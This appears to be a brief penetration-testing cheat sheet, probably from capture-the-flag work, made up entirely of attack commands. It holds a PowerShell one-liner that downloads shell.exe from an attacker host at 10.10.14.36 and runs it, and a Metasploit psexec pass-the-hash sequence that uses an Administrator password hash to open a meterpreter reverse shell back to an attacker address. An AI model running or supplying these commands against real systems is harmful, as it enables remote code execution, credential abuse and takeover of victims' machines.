# Powershell downloader

```
powershell.exe -Command "Invoke-WebRequest -Uri \"http://10.10.14.36:8000/shell.exe\" -OutFile \"C:\\Users\\kohsuke\\Desktop\\out.exe\"; Start-Process -Filepath \"C:\\Users\\kohsuke\\Desktop\\out.exe\"; Start-Sleep -s 360000"
```

# PSExec via LM-Hash
(https://mlcsec.com/abusing-windows-credentials/#pass-the-hash)
```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
msf exploit(psexec) > set SMBUser Administrator 
msf exploit(psexec) > set SMBDomain WORKGROUP
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost AttackerIP
msf exploit(psexec) > set lport Port
msf exploit(psexec) > run
```
